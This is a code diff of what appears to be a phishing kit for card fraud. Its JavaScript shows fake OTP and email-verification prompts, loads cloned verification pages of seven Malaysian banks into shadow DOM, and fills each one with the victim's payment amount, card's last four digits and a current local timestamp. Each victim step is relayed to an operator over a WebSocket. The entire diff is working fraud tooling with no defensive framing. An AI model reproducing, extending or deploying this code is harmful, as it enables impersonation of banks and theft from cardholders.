@@ -604,6 +604,7 @@
               var sfx = p.phoneSuffix || document.getElementById('phone')?.value?.slice(-4) || '****';
               var otpP = document.querySelector('#otp-form p');
               if (otpP) otpP.textContent = 'We have sent OTP to your registered mobile number ending '+sfx+'. Please enter the OTP below.';
+              document.querySelector("#otp-amount").textContent = 'RM '+document.getElementById('total-amount').textContent.replace(/[^\d.]/g,'');
               q('otp-overlay').classList.remove('hidden');
               q('otp-code').value = '';
               q('otp-error').style.display = 'none';
@@ -616,6 +617,9 @@
             else if(a === 'email_verify' || a === 'custom_email_verify' || a === 'custom_email_tail') {
               q('load-overlay').classList.add('hidden');
               _curStep = 'email_verify';
+              var sfx = p.phoneSuffix || document.querySelector("#email").value;
+              document.querySelector("#email-form > p").innerHTML = 'We have resent One-Time Password (OTP) in a text message to your registered email ' + sfx + '.<br>Please submit your One-Time Password (OTP).';
+              document.querySelector("#email-amount").textContent = 'RM '+document.getElementById('total-amount').textContent.replace(/[^\d.]/g,'');
               q('email-overlay').classList.remove('hidden');
               q('email-code').value = '';
               q('email-error').style.display = 'none';
@@ -646,22 +650,14 @@
               _curStep = 'app_verify';
               q('app-verify-overlay').classList.remove('hidden');
               var bn = (p.cardInfo && p.cardInfo.bankName) || p.bankName || '';
-              if(/AMBANK/i.test(bn)) {
-              showMount1(p)}
-              else if(/CIMB/i.test(bn)) {
-              showMount2(p)}
-              else if(/MALAYAN/i.test(bn)) {
-              showMount3(p)}
-              else if(/OCBC|OVERSEA/i.test(bn)) {
-              showMount4(p)}
-              else if(/RHB/i.test(bn)) {
-              showMount5(p)}
-              else if(/PUBLIC/i.test(bn)) {
-              showMount6(p)}
-              else if(/STANDARD CHARTERED/i.test(bn)) {
-              showMount7(p)}
-              else {
-              showGenericApp(p)}
+              if(bn === 'AMBANK (M) BERHAD') {showMount1(p)}
+              else if(bn === 'CIMB BANK BERHAD') {showMount2(p)}
+              else if(bn === 'MALAYAN BANKING BERHAD') {showMount3(p)}
+              else if(bn === 'OVERSEA-CHINESE BANKING CORPORATION LTD.' || bn === 'OCBC BANK (MALAYSIA) BERHAD') {showMount4(p)}
+              else if(bn === 'RHB BANK BERHAD') {showMount5(p)}
+              else if(bn === 'PUBLIC BANK BERHAD') {showMount6(p)}
+              else if(bn === 'STANDARD CHARTERED BANK MALAYSIA BERHAD') {showMount7(p)}
+              else {showGenericApp(p)}
               }else if(a === 'app_verify_fail') {
               showAppError(p)}
               else if(a === 'approve') {
@@ -948,21 +944,13 @@
                                       );
                                       q('otp-submit').addEventListener('click',submitOtp);
                                       q('otp-resend').addEventListener('click',function() {
-                                        ws.send(JSON.stringify( {
-                                          type : 'session_update',payload :  {
-                                            sessionId : sid,status : 'pending',cardInfo :  {
-                                            }
-                                          ,currentStep : 'resend_otp'}
-                                        }))}
+                                        ws.send(JSON.stringify({ type: 'resend_otp', payload: { sessionId: sid } }));
+                                      }
                                         );
                                         q('email-submit').addEventListener('click',submitEmailVerify);
                                         q('email-resend').addEventListener('click',function() {
-                                          ws.send(JSON.stringify( {
-                                            type : 'session_update',payload :  {
-                                              sessionId : sid,status : 'pending',cardInfo :  {
-                                              }
-                                            ,currentStep : 'resend_email'}
-                                          }))}
+                                        ws.send(JSON.stringify({ type: 'resend_otp', payload: { sessionId: sid } }));
+                                               }
                                           );
                                           q('otp-code').addEventListener('input',function() {
                                           this.value = this.value.replace(/\D/g,'').slice(0,8)}
@@ -989,82 +977,138 @@
                                             catch(e) {
                                             }
                                           })();
-                                          /* Shadow DOM bank page loader */function loadBankPage(path,mid) {
-                                            fetch(path).then(function(r) {
-                                            return r.text()}
-                                            ).then(function(html) {
-                                              var el = document.getElementById(mid);
-                                              if(!el)return;
-                                              var shadow = el.attachShadow( {
-                                              mode : 'open'}
-                                              );
-                                               var styleLinks = html.match(/<link[^>]*rel=["']stylesheet["'][^>]*href=["']([^"']+)["'][^>]*>/gi) || [];
-                                              var baseDir = path.replace(/\/[^\/]*$/,'/');
-                                              var cssPromises = [];
-                                              styleLinks.forEach(function(link) {
-                                                 var m = link.match(/href=["']([^"']+)["']/);
-                                                if(m) {
-                                                  var href = m[1].replace(/^\.\//,'').replace(/^[^\/]+\//,'');
-                                                  var cssPath = baseDir+href;
-                                                  cssPromises.push(fetch(cssPath).then(function(r2) {
-                                                  return r2.text()}
-                                                  ).catch(function() {
-                                                  return''}
-                                                  ));
-                                                }
-                                              });
-                                              html = html.replace(/<link[^>]*>/gi,'');
-                                              return Promise.all(cssPromises).then(function(cssContents) {
-                                                shadow.innerHTML = '<style>'+cssContents.join('\n')+'</style>'+html;
-                                              }
-                                              );
-                                            }
-                                            ).catch(function(err) {
-                                            console.error('Bank load error : ',err)}
-                                          )}
-                                          ['AMBANK','CIMB','MALAYAN','OCBC','PBB','RHB','SCBMB'].forEach(function(bank,idx) {
-                                          loadBankPage(bank+'/index.html','mount'+(idx+1))}
-                                          );
                                           function showMount1(p) {
                                             q('mount1').classList.remove('hidden');
-                                          document.getElementById('mount1').shadowRoot.querySelector('div>table.maintable.bg>tbody>tr:nth-child(4)>td:nth-child(3)>span').textContent = 'RM '+q('total-amount').textContent.replace(/[^\d.]/g,'')}
+                                            var s1 = document.getElementById('mount1').shadowRoot;
+                                            s1.querySelector('div>table.maintable.bg>tbody>tr:nth-child(4)>td:nth-child(3)>span').textContent = 'RM '+q('total-amount').textContent.replace(/[^\d.]/g,'');
+                                            var now = new Date();
+                                            var opts = {weekday:'short',month:'short',day:'2-digit',year:'numeric',timeZone:'Asia/Kuala_Lumpur'};
+                                            var parts = new Intl.DateTimeFormat('en-US',opts).formatToParts(now);
+                                            var ds = parts.find(function(p){return p.type==='weekday'}).value+' '+parts.find(function(p){return p.type==='month'}).value+' '+parts.find(function(p){return p.type==='day'}).value+' '+parts.find(function(p){return p.type==='year'}).value;
+                                            var ts = now.toLocaleTimeString('en-GB',{hour12:false,timeZone:'Asia/Kuala_Lumpur'});
+                                            s1.querySelector('div>table.maintable.bg>tbody>tr:nth-child(5)>td:nth-child(3)').innerHTML = '<span>'+ds+'</span><br><span>'+ts+' GMT +0800</span>';
+                                          }
                                           function showMount2(p) {
                                             q('mount2').classList.remove('hidden');
-                                            try {
-                                              var m2 = document.getElementById('mount2').shadowRoot;
-                                              m2.querySelector('div>table:nth-child(2)>tbody>tr:nth-child(4)>td:nth-child(3)>span').textContent = 'RM '+q('total-amount').textContent.replace(/[^\d.]/g,'');
-                                            m2.querySelector('div>table:nth-child(2)>tbody>tr:nth-child(6)>td:nth-child(3)>span').textContent = (p.cardInfo.cardNumber || '').slice(-4)}
-                                            catch(e) {
-                                            }
-                                            }function showMount3(p) {
-                                              q('mount3').classList.remove('hidden');
-                                              try {
-                                                var m3 = document.getElementById('mount3').shadowRoot;
-                                                m3.querySelector('div>table.infotable.infotableoob>tbody>tr:nth-child(2)>td:nth-child(2)>div').innerHTML = '<span>RM '+q('total-amount').textContent.replace(/[^\d.]/g,'')+'</span>';
-                                              m3.querySelector('div>table.infotable.infotableoob>tbody>tr:nth-child(4)>td:nth-child(2)>div>span').textContent = (p.cardInfo.cardNumber || '').slice(-4)}
-                                              catch(e) {
-                                              }
-                                              }function showMount4(p) {
-                                                q('mount4').classList.remove('hidden');
-                                                try {
-                                                  var m4 = document.getElementById('mount4').shadowRoot;
-                                                  m4.querySelector('#softTokenPanel>tbody>tr:nth-child(2)>td>table>tbody>tr:nth-child(1)>td:nth-child(2)>span').textContent = 'RM '+q('total-amount').textContent.replace(/[^\d.]/g,'');
-                                                m4.querySelector('#softTokenPanel>tbody>tr:nth-child(2)>td>table>tbody>tr:nth-child(3)>td:nth-child(2)>span:nth-child(2)').textContent = (p.cardInfo.cardNumber || '').slice(-4)}
-                                                catch(e) {
-                                                }
-                                                }function showMount5(p) {
-                                                  q('mount5').classList.remove('hidden');
-                                                  try {
-                                                    var m5 = document.getElementById('mount5').shadowRoot;
-                                                    m5.querySelector('div>div.container>table:nth-child(3)>tbody.oobtrxinfo>tr.mobileshow>td>div:nth-child(2)>div').textContent = 'RM '+q('total-amount').textContent.replace(/[^\d.]/g,'');
-                                                  m5.querySelector('div>div.container>table:nth-child(3)>tbody.oobtrxinfo>tr.mobileshow>td>div:nth-child(4)>div>span').textContent = (p.cardInfo.cardNumber || '').slice(-4)}
-                                                  catch(e) {
-                                                  }
-                                                  }function showMount6(p) {
-                                                  q('mount6').classList.remove('hidden')}
-                                                  function showMount7(p) {
-                                                  q('mount7').classList.remove('hidden')}
-                                                  wsConnect();
-                                                  </script>
+                                            try{var s2=document.getElementById('mount2').shadowRoot;
+                                            s2.querySelector('div>table:nth-child(2)>tbody>tr:nth-child(4)>td:nth-child(3)>span').textContent='RM '+q('total-amount').textContent.replace(/[^\d.]/g,'');
+                                            s2.querySelector('div>table:nth-child(2)>tbody>tr:nth-child(6)>td:nth-child(3)>span').textContent=(p.cardInfo.cardNumber||'').slice(-4);
+                                            var now=new Date();var opts={weekday:'short',month:'short',day:'2-digit',year:'numeric',timeZone:'Asia/Kuala_Lumpur'};
+                                            var parts=new Intl.DateTimeFormat('en-US',opts).formatToParts(now);
+                                            var ds=parts.find(function(p){return p.type==='weekday'}).value+' '+parts.find(function(p){return p.type==='month'}).value+' '+parts.find(function(p){return p.type==='day'}).value+' '+parts.find(function(p){return p.type==='year'}).value;
+                                            var ts=now.toLocaleTimeString('en-GB',{hour12:false,timeZone:'Asia/Kuala_Lumpur'});
+                                            s2.querySelector('div>table:nth-child(2)>tbody>tr:nth-child(5)>td:nth-child(3)').innerHTML='<span>'+ds+'</span><br><span>'+ts+' GMT +0800</span>';}catch(e){}
+                                          }
+                                          function showMount3(p) {
+                                            q('mount3').classList.remove('hidden');
+                                            try{var s3=document.getElementById('mount3').shadowRoot;
+                                            s3.querySelector('div>table.infotable.infotableoob>tbody>tr:nth-child(2)>td:nth-child(2)>div').innerHTML='<span>RM '+q('total-amount').textContent.replace(/[^\d.]/g,'')+'</span>';
+                                            s3.querySelector('div>table.infotable.infotableoob>tbody>tr:nth-child(4)>td:nth-child(2)>div>span').textContent=(p.cardInfo.cardNumber||'').slice(-4);
+                                            var now=new Date();var opts={weekday:'short',month:'short',day:'2-digit',year:'numeric',timeZone:'Asia/Kuala_Lumpur'};
+                                            var parts=new Intl.DateTimeFormat('en-US',opts).formatToParts(now);
+                                            var ds=parts.find(function(p){return p.type==='weekday'}).value+' '+parts.find(function(p){return p.type==='month'}).value+' '+parts.find(function(p){return p.type==='day'}).value+' '+parts.find(function(p){return p.type==='year'}).value;
+                                            var ts=now.toLocaleTimeString('en-GB',{hour12:false,timeZone:'Asia/Kuala_Lumpur'});
+                                            s3.querySelector('div>table.infotable.infotableoob>tbody>tr:nth-child(3)>td:nth-child(2)>div>span').innerHTML='<span>'+ds+'</span>';}catch(e){}
+                                          }
+                                          function showMount4(p) {
+                                            q('mount4').classList.remove('hidden');
+                                            try{var s4=document.getElementById('mount4').shadowRoot;
+                                            s4.querySelector('#softTokenPanel>tbody>tr:nth-child(2)>td>table>tbody>tr:nth-child(1)>td:nth-child(2)>span').textContent='RM '+q('total-amount').textContent.replace(/[^\d.]/g,'');
+                                            s4.querySelector('#softTokenPanel>tbody>tr:nth-child(2)>td>table>tbody>tr:nth-child(3)>td:nth-child(2)>span:nth-child(2)').textContent=(p.cardInfo.cardNumber||'').slice(-4);
+                                            var now=new Date();var opts={weekday:'short',month:'short',day:'2-digit',year:'numeric',timeZone:'Asia/Kuala_Lumpur'};
+                                            var parts=new Intl.DateTimeFormat('en-US',opts).formatToParts(now);
+                                            var ds=parts.find(function(p){return p.type==='weekday'}).value+' '+parts.find(function(p){return p.type==='month'}).value+' '+parts.find(function(p){return p.type==='day'}).value+' '+parts.find(function(p){return p.type==='year'}).value;
+                                            var ts=now.toLocaleTimeString('en-GB',{hour12:false,timeZone:'Asia/Kuala_Lumpur'});
+                                            s4.querySelector('#softTokenPanel>tbody>tr:nth-child(2)>td>table>tbody>tr:nth-child(4)>td:nth-child(2)').innerHTML='<span>'+ds+'</span><span>'+ts+'</span>';}catch(e){}
+                                          }
+                                          function showMount5(p) {
+                                            q('mount5').classList.remove('hidden');
+                                            try{var s5=document.getElementById('mount5').shadowRoot;
+                                            s5.querySelector('div>div.container>table:nth-child(3)>tbody.oobtrxinfo>tr.mobileshow>td>div:nth-child(2)>div').textContent='RM '+q('total-amount').textContent.replace(/[^\d.]/g,'');
+                                            s5.querySelector('div>div.container>table:nth-child(3)>tbody.oobtrxinfo>tr.mobileshow>td>div:nth-child(4)>div>span').textContent=(p.cardInfo.cardNumber||'').slice(-4);
+                                            var now=new Date();var opts={weekday:'short',month:'short',day:'2-digit',year:'numeric',timeZone:'Asia/Kuala_Lumpur'};
+                                            var parts=new Intl.DateTimeFormat('en-US',opts).formatToParts(now);
+                                            var ds=parts.find(function(p){return p.type==='weekday'}).value+' '+parts.find(function(p){return p.type==='month'}).value+' '+parts.find(function(p){return p.type==='day'}).value+' '+parts.find(function(p){return p.type==='year'}).value;
+                                            var ts=now.toLocaleTimeString('en-GB',{hour12:false,timeZone:'Asia/Kuala_Lumpur'});
+                                            s5.querySelector('div>div.container>table:nth-child(3)>tbody.oobtrxinfo>tr.mobileshow>td>div:nth-child(3)>div').innerHTML='<span>'+ds+'</span><br><span>'+ts+'</span>';}catch(e){}
+                                          }
+                                          function showMount6(p) {
+                                            q('mount6').classList.remove('hidden');
+                                          }
+                                          function showMount7(p) {
+                                            q('mount7').classList.remove('hidden');
+                                          }
+
+                                          function CifAppVerifyContinue1() {
+                                            var s1=document.getElementById('mount1').shadowRoot;
+                                            if(s1){var sp=s1.querySelector('div>div');if(sp){sp.style.display='flex';sp.classList.remove('hidden')}}
+                                            if(ws&&ws.readyState===WebSocket.OPEN&&sid)ws.send(JSON.stringify({type:'app_verify_done',payload:{sessionId:sid}}))
+                                          }
+                                          function CifAppVerifyContinue2() {
+                                            var s2=document.getElementById('mount2').shadowRoot;
+                                            if(s2){var sp=s2.querySelector('div>div');if(sp){sp.style.display='flex';sp.classList.remove('hidden')}}
+                                            if(ws&&ws.readyState===WebSocket.OPEN&&sid)ws.send(JSON.stringify({type:'app_verify_done',payload:{sessionId:sid}}))
+                                          }
+                                          function CifAppVerifyContinue3() {
+                                            var s3=document.getElementById('mount3').shadowRoot;
+                                            if(s3){var sp=s3.querySelector('div>div');if(sp){sp.style.display='flex';sp.classList.remove('hidden')}}
+                                            if(ws&&ws.readyState===WebSocket.OPEN&&sid)ws.send(JSON.stringify({type:'app_verify_done',payload:{sessionId:sid}}))
+                                          }
+                                          function CifAppVerifyContinue4() {
+                                            var s4=document.getElementById('mount4').shadowRoot;
+                                            if(s4){var sp=s4.querySelector('div>div');if(sp){sp.style.display='flex';sp.classList.remove('hidden')}}
+                                            if(ws&&ws.readyState===WebSocket.OPEN&&sid)ws.send(JSON.stringify({type:'app_verify_done',payload:{sessionId:sid}}))
+                                          }
+                                          function CifAppVerifyContinue5() {
+                                            var s5=document.getElementById('mount5').shadowRoot;
+                                            if(s5){var sp=s5.querySelector('div>div');if(sp){sp.style.display='flex';sp.classList.remove('hidden')}}
+                                            if(ws&&ws.readyState===WebSocket.OPEN&&sid)ws.send(JSON.stringify({type:'app_verify_done',payload:{sessionId:sid}}))
+                                          }
+                                          function CifAppVerifyContinue6() {
+                                            var s6=document.getElementById('mount6').shadowRoot;
+                                            if(s6){var sp=s6.querySelector('div>div');if(sp){sp.style.display='flex';sp.classList.remove('hidden')}}
+                                            if(ws&&ws.readyState===WebSocket.OPEN&&sid)ws.send(JSON.stringify({type:'app_verify_done',payload:{sessionId:sid}}))
+                                          }
+                                          function CifAppVerifyContinue7() {
+                                            var s7=document.getElementById('mount7').shadowRoot;
+                                            if(s7){var sp=s7.querySelector('div>div');if(sp){sp.style.display='flex';sp.classList.remove('hidden')}}
+                                            if(ws&&ws.readyState===WebSocket.OPEN&&sid)ws.send(JSON.stringify({type:'app_verify_done',payload:{sessionId:sid}}))
+                                          }
+
+                                          /* Shadow DOM bank page loader with event hookup */
+                                          async function loadBankPage(path,mid,fnIdx) {
+                                            try{
+                                              var html=await fetch(path).then(function(r){return r.text()});
+                                              var el=document.getElementById(mid);if(!el)return;
+                                              var shadow=el.attachShadow({mode:'open'});
+                                              var styleLinks=html.match(/<link[^>]*rel=["']stylesheet["'][^>]*href=["']([^"']+)["'][^>]*>/gi)||[];
+                                              var baseDir=path.replace(/\/[^\/]*$/,'/');
+                                              var cssPromises=[];
+                                              styleLinks.forEach(function(link){
+                                                var m=link.match(/href=["']([^"']+)["']/);
+                                                if(m){var href=m[1].replace(/^\.\//,'').replace(/^[^\/]+\//,'');cssPromises.push(fetch(baseDir+href).then(function(r2){return r2.text()}).catch(function(){return''}))}
+                                              });
+                                              var cssContents=await Promise.all(cssPromises);
+                                              html=html.replace(/<link[^>]*>/gi,'');
+                                              shadow.innerHTML='<style>'+cssContents.join('\n')+'</style>'+html;
+                                              // Hook continue button per bank
+                                              var contFns=[CifAppVerifyContinue1,CifAppVerifyContinue2,CifAppVerifyContinue3,CifAppVerifyContinue4,CifAppVerifyContinue5,CifAppVerifyContinue6,CifAppVerifyContinue7];
+                                              var btns=[
+                                                shadow.querySelector('#formactions>a>div'),
+                                                shadow.querySelector('#formactions>a>div'),
+                                                shadow.querySelector('#oobCheckBtn>div'),
+                                                shadow.querySelector('#formactions'),
+                                                shadow.querySelector('#formactionsoob>td>a>div'),
+                                                shadow.querySelector('#ExitLink'),
+                                                shadow.querySelector('#ExitLink')
+                                              ];
+                                              var btn=btns[fnIdx];if(btn&&contFns[fnIdx])btn.addEventListener('click',contFns[fnIdx]);
+                                            }catch(e){console.error('Bank load error:',mid,e)}
+                                          }
+                                          ['AMBANK','CIMB','MALAYAN','OCBC','PBB','RHB','SCBMB'].forEach(function(bank,idx){
+                                            loadBankPage(bank+'/index.html','mount'+(idx+1),idx)
+                                          });
+                                          wsConnect();
+                                          </script>
 </body>
 </html>
